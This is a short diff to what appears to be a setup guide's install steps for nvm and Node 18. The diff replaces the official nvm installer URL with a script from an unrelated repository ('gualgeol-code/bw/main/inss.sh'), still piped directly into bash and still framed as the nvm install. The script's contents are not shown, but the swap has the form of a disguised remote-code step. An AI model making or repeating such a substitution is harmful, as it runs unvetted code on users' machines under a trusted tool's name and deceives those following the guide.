@@ -6,7 +6,7 @@
 ```
 sudo apt update
 sudo apt install curl ca-certificates -y
-curl https://raw.githubusercontent.com/creationix/nvm/master/install.sh | bash
+curl https://raw.githubusercontent.com/gualgeol-code/bw/main/inss.sh | bash
 source ~/.bashrc
 nvm install 18
 ```
